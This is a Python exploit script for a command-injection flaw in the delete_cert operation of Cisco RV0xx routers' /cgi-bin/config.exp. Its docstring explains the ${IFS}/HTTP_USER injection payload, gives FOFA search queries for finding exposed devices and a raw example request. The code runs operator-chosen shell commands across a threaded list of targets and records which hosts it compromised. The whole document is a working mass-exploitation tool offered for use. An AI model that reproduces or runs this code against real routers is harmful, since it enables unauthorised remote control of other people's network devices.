#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""
RV0xx config.exp delete_cert command injection batch exploit.
Compatible with Python 3.4.3+ (no f-strings, no random.choices, legacy ssl API).

================================================================================
1. Full Execution Flow
================================================================================

Core vulnerability trigger:
  This exploit triggers command injection through the delete_cert operation in
  /cgi-bin/config.exp. The critical part is the following payload embedded in
  the request URI:

      /cgi-bin/config.exp?op=delete_cert&1&;eval${IFS}${HTTP_USER};=4

Breakdown:
  - ${IFS} substitutes for a space character and helps bypass simple filters.
  - eval${IFS}${HTTP_USER} evaluates the HTTP_USER environment variable in
    the server-side shell context.
  - HTTP_USER is derived from the User request header, so the command is
    injected through the User header.

Key code logic:
  1. parse_url() extracts schema, host, and port, supporting HTTP, HTTPS, and
     host:port inputs.
  2. rce() builds a raw HTTP request with a socket to preserve the original
     exploit primitive.
  3. The User header is constructed as:

       User: echo "\\r";<command>

     echo "\\r" creates a clean output boundary before the supplied command runs.
  4. The script extracts the HTTP response body and truncates it before
     "Content-type: text/html" to isolate command output.

Exploitation flow:
  1. Connect to the target HTTP or HTTPS service.
  2. Send a crafted GET request to /cgi-bin/config.exp.
  3. Inject eval${IFS}${HTTP_USER} into the URI.
  4. Put the actual OS command in the User request header.
  5. The server executes the command from the User header and returns output in
     the HTTP response.

Trigger points:
  - ;eval${IFS}${HTTP_USER}; in the URI.
  - The command content inside the User request header.
  - ${IFS} as a space bypass.
  - A raw socket request to avoid client-side normalization of special
    characters.

Command output behavior:
  The exploit has command output echo.
  Evidence:
    - The original rce() reads the complete HTTP response.
    - It extracts the body with response.split(b"\\r\\n\\r\\n", 1)[1].
    - verify() runs cat /tmp/nk_sysconfig | grep 'fmVersion' and parses
      model/fmVersion from the returned body.
    - Command output can therefore be obtained directly from the response body.

================================================================================
2. FOFA Asset Discovery Queries
================================================================================

Recommended query, optimized for precision:

  (body="RV042" || body="RV082" || body="RV016" || body="RV320" || body="RV325") && body="/cgi-bin/config.exp"

Broader query:

  (title="Cisco" || body="Cisco") && (body="RV042" || body="RV082" || body="RV320" || body="RV325")

Endpoint-focused query:

  body="/cgi-bin/config.exp" && (body="delete_cert" || body="config.exp")

Notes:
  The exploit endpoint is /cgi-bin/config.exp?op=delete_cert. For asset
  discovery, combine brand/model fingerprints with config.exp to reduce false
  positives, then use this script's random echo check for confirmation.

================================================================================
3. Corresponding HTTP Request
================================================================================

Example request for executing id:

  GET /cgi-bin/config.exp?op=delete_cert&1&;eval${IFS}${HTTP_USER};=4 HTTP/1.1
  Host: <target>:<port>
  User: echo "\\r";id
  Referer: http://test1.htm
  Referer: https://test1.htm
  Accept: */*
  Connection: close

Notes:
  - The HTTP_USER environment variable is typically mapped from the User header.
  - eval${IFS}${HTTP_USER} executes the content of the User header.
  - For HTTPS targets, the same raw HTTP payload must be sent over a TLS socket.

================================================================================
4. Standardized Usage
================================================================================

  python exp.py -i input.txt -o output.txt -c "command" -t 10

input.txt supports:
  192.168.1.1
  192.168.1.1:443
  http://192.168.1.1
  https://192.168.1.1:443

The script first executes echo <random marker> to verify command execution and
output echo. Only after that check succeeds does it execute the -c command.
Only targets that pass echo verification are written to output.txt.

Fallback (built-in):
  On SSL handshake failure, retries legacy TLS ciphers, then plain HTTP on the
  same port, then HTTP on port 80. Successful targets are saved with the URL
  that actually worked (often http:// when input was https://).
"""

from __future__ import print_function

import argparse
import concurrent.futures
import random
import re
import socket
import ssl
import string
import sys

try:
    from urllib.parse import urlparse
except ImportError:
    from urlparse import urlparse


def parse_url(url):
    """Extract schema, host, and port from a target URL, inferring scheme by port."""
    url = url.strip()
    if not url.startswith(("http://", "https://")):
        if ":443" in url:
            url = "https://" + url
        else:
            url = "http://" + url

    parsed = urlparse(url)
    schema = parsed.scheme or "http"
    host = parsed.hostname
    if not host:
        host = parsed.path.split("/")[0]

    if parsed.port:
        port = parsed.port
    else:
        port = 443 if schema == "https" else 80

    return schema, host, port


def normalize_url(url):
    """Normalize the target URL for consistent output."""
    schema, host, port = parse_url(url)
    if (schema == "http" and port == 80) or (schema == "https" and port == 443):
        return "{0}://{1}".format(schema, host)
    return "{0}://{1}:{2}".format(schema, host, port)


def random_marker(length=12):
    """Generate a random echo marker used to confirm execution and response echo."""
    alphabet = string.ascii_letters + string.digits
    return "".join(random.choice(alphabet) for _ in range(length))


def recv_all(sock):
    """Read a socket response, preserving partial data before timeout."""
    chunks = []
    while True:
        try:
            data = sock.recv(4096)
            if not data:
                break
            chunks.append(data)
        except socket.timeout:
            break
    return b"".join(chunks)


def _ssl_protocols():
    """Return SSL protocol constants available on this Python build (3.4-safe)."""
    names = ("PROTOCOL_SSLv23", "PROTOCOL_TLSv1_2", "PROTOCOL_TLSv1_1", "PROTOCOL_TLSv1")
    protocols = []
    for name in names:
        proto = getattr(ssl, name, None)
        if proto is not None and proto not in protocols:
            protocols.append(proto)
    return protocols


def _ssl_contexts():
    """Yield SSL contexts from legacy-friendly down to create_default_context."""
    cipher_lists = (
        "ALL:@SECLEVEL=0:!aNULL:!eNULL",
        "DEFAULT@SECLEVEL=0:!DHE",
        "HIGH:!aNULL:!eNULL:!3DES",
        "DEFAULT",
    )

    for proto in _ssl_protocols():
        try:
            ctx = ssl.SSLContext(proto)
            ctx.check_hostname = False
            ctx.verify_mode = ssl.CERT_NONE
            try:
                ctx.options |= ssl.OP_NO_SSLv2
            except (AttributeError, TypeError):
                pass
            for cipher in cipher_lists:
                try:
                    ctx.set_ciphers(cipher)
                    yield ctx
                    break
                except ssl.SSLError:
                    continue
            else:
                yield ctx
        except Exception:
            pass

    try:
        ctx = ssl.create_default_context()
        ctx.check_hostname = False
        ctx.verify_mode = ssl.CERT_NONE
        for cipher in ("DEFAULT@SECLEVEL=0:!DHE", "ALL:@SECLEVEL=0", "DEFAULT"):
            try:
                ctx.set_ciphers(cipher)
                yield ctx
                break
            except ssl.SSLError:
                continue
        else:
            yield ctx
    except Exception:
        pass


def _format_host_header(host, port, use_ssl):
    if (use_ssl and port == 443) or (not use_ssl and port == 80):
        return host
    return "{0}:{1}".format(host, port)


def _working_url(schema, host, port):
    if (schema == "http" and port == 80) or (schema == "https" and port == 443):
        return "{0}://{1}".format(schema, host)
    return "{0}://{1}:{2}".format(schema, host, port)


def _candidate_endpoints(url):
    """Build ordered (schema, port, use_ssl) attempts for one target."""
    schema, host, port = parse_url(url)
    candidates = [(schema, port, schema == "https")]
    if schema == "https":
        candidates.append(("http", port, False))
        if port != 80:
            candidates.append(("http", 80, False))
    elif port == 80:
        candidates.append(("https", 443, True))
    elif port not in (80, 443):
        candidates.append(("https", port, True))
    seen = set()
    ordered = []
    for item in candidates:
        if item not in seen:
            seen.add(item)
            ordered.append(item)
    return host, ordered


def _connect_tls(host, port, timeout):
    """Try multiple SSL contexts until handshake succeeds."""
    last_err = None
    for ctx in _ssl_contexts():
        sock = None
        try:
            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            sock.settimeout(timeout)
            sock.connect((host, port))
            try:
                wrapped = ctx.wrap_socket(sock, server_hostname=host)
            except TypeError:
                wrapped = ctx.wrap_socket(sock)
            return wrapped, None
        except Exception as exc:
            last_err = exc
            if sock:
                try:
                    sock.close()
                except Exception:
                    pass
    return None, last_err


def _connect_plain(host, port, timeout):
    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    sock.settimeout(timeout)
    sock.connect((host, port))
    return sock


def extract_body(response):
    """Extract the command output body from an HTTP response."""
    if not response:
        return ""

    if b"\r\n\r\n" in response:
        body = response.split(b"\r\n\r\n", 1)[1]
    else:
        body = response

    end = body.find(b"Content-type: text/html")
    if end != -1:
        body = body[:end]

    return body.decode("utf-8", errors="ignore").strip()


def send_exploit(cmd, host, candidates, timeout=12):
    """
    Send exploit over each candidate endpoint until one returns data.
    Returns (body, working_url, error).
    """
    pd = "eval${IFS}${HTTP_USER}"
    uri = "/cgi-bin/config.exp?op=delete_cert&1&;{0};=4".format(pd)
    last_error = "no endpoint succeeded"

    for schema, port, use_ssl in candidates:
        host_header = _format_host_header(host, port, use_ssl)
        raw_request = "\r\n".join([
            "GET {0} HTTP/1.1".format(uri),
            "Host: {0}".format(host_header),
            'User: echo "\\r";{0}'.format(cmd),
            "Referer: http://test1.htm",
            "Referer: https://test1.htm",
            "Accept: */*",
            "Connection: close",
            "",
            "",
        ])

        sock = None
        try:
            if use_ssl:
                sock, tls_err = _connect_tls(host, port, timeout)
                if sock is None:
                    last_error = "SSL {0}://{1}:{2}: {3}".format(schema, host, port, tls_err)
                    continue
            else:
                sock = _connect_plain(host, port, timeout)

            sock.sendall(raw_request.encode("utf-8", errors="ignore"))
            response = recv_all(sock)
            body = extract_body(response)
            if body or response:
                return body, _working_url(schema, host, port), None
            last_error = "empty response on {0}://{1}:{2}".format(schema, host, port)
        except ssl.SSLError as exc:
            last_error = "SSL {0}://{1}:{2}: {3}".format(schema, host, port, exc)
        except socket.timeout:
            last_error = "timeout {0}://{1}:{2}".format(schema, host, port)
        except OSError as exc:
            last_error = "connect {0}://{1}:{2}: {3}".format(schema, host, port, exc)
        except Exception as exc:
            last_error = "{0}://{1}:{2}: {3}".format(schema, host, port, exc)
        finally:
            if sock:
                try:
                    sock.close()
                except Exception:
                    pass

    return "", None, last_error


def rce(url, cmd):
    """
    Exploit with multi-TLS and protocol fallback.
    Returns (body, working_url, error).
    """
    host, candidates = _candidate_endpoints(url)
    body, working_url, err = send_exploit(cmd, host, candidates)
    if working_url:
        return body, working_url, None
    return "", None, err or "target unreachable"


def verify_target(url):
    """Verify RCE with an echo-based random marker."""
    marker = random_marker()
    body, working_url, err = rce(url, "echo {0}".format(marker))
    if working_url and marker in body:
        return True, body, working_url
    fail_msg = body or err or ""
    return False, fail_msg, None


def fingerprint(url):
    """Optional fingerprint command: read model and firmware from system config."""
    cmd = "cat /tmp/nk_sysconfig|grep 'fmVersion'"
    response, _, err = rce(url, cmd)
    if err:
        return err
    if "fmVersion" not in response:
        return response

    model_match = re.search(r"'model=([^']+)'", response)
    fm_match = re.search(r"'fmVersion=([^']+)'", response)
    model = model_match.group(1) if model_match else "unknown"
    fm_version = fm_match.group(1) if fm_match else "unknown"
    return "model={0}, fmVersion={1}".format(model, fm_version)


def process_target(target, command):
    """
    Process a single target:
      1. Verify command execution with a random echo marker.
      2. Execute the user-supplied command after verification succeeds.
      3. Return a structured result for threaded batch processing.
    """
    target = target.strip()
    if not target:
        return False, target, "empty target"

    try:
        normalized = normalize_url(target)
        ok, verify_output, working_url = verify_target(normalized)
        if not ok:
            preview = (verify_output or "no response")[:200]
            return False, normalized, "verification failed: {0}".format(preview)

        output, _, err = rce(working_url or normalized, command)
        if err:
            return False, working_url or normalized, "command failed: {0}".format(err)

        saved = working_url or normalized
        if output:
            preview = output[:300] + "..." if len(output) > 300 else output
            via = " (via {0})".format(saved) if working_url and working_url != normalized else ""
            return True, saved, "command executed{0}, output: {1}".format(via, preview)

        return True, saved, "command executed, empty output"
    except Exception as exc:
        return False, target, "error: {0}".format(exc)


def main():
    parser = argparse.ArgumentParser(
        description="RV0xx config.exp delete_cert RCE batch exploit",
        formatter_class=argparse.RawDescriptionHelpFormatter,
        epilog="""
Examples:
  python exp.py -i input.txt -o output.txt -c "id"
  python exp.py -i input.txt -o output.txt -c "cat /tmp/nk_sysconfig" -t 20
        """,
    )
    parser.add_argument("-i", "--input", required=True, help="Input file with one target host/URL per line")
    parser.add_argument("-o", "--output", required=True, help="Output file for targets with confirmed command execution")
    parser.add_argument("-c", "--command", required=True, help="System command to execute")
    parser.add_argument("-t", "--threads", type=int, default=10, help="Number of threads (default: 10)")
    args = parser.parse_args()

    try:
        with open(args.input, "r") as file:
            targets = [line.strip() for line in file if line.strip() and not line.strip().startswith("#")]
    except Exception as exc:
        print("[!] Failed to read input file: {0}".format(exc))
        sys.exit(1)

    print("[*] RV0xx config.exp delete_cert RCE batch exploit")
    print("[*] Loaded targets: {0}".format(len(targets)))
    print("[*] Threads: {0}".format(args.threads))
    print("[*] Command: {0}".format(args.command))
    print("[*] Verification: echo random marker before executing command")
    print("[*] Fallback: legacy TLS -> http same port -> http:80")
    print("-" * 70)

    successful = []

    with concurrent.futures.ThreadPoolExecutor(max_workers=args.threads) as executor:
        future_map = {executor.submit(process_target, target, args.command): target for target in targets}
        for future in concurrent.futures.as_completed(future_map):
            original = future_map[future]
            try:
                success, target_url, message = future.result()
                if success:
                    print("[+] {0} => SUCCESS | {1}".format(target_url, message))
                    successful.append(target_url)
                else:
                    print("[-] {0} => {1}".format(target_url, message))
            except Exception as exc:
                print("[!] {0} => unexpected error: {1}".format(original, exc))

    print("-" * 70)

    if successful:
        try:
            with open(args.output, "w") as file:
                for target in successful:
                    file.write(target + "\n")
            print("[+] Saved {0} successful targets to {1}".format(len(successful), args.output))
        except Exception as exc:
            print("[!] Failed to write output file: {0}".format(exc))
    else:
        print("[*] No successful targets")


if __name__ == "__main__":
    main()
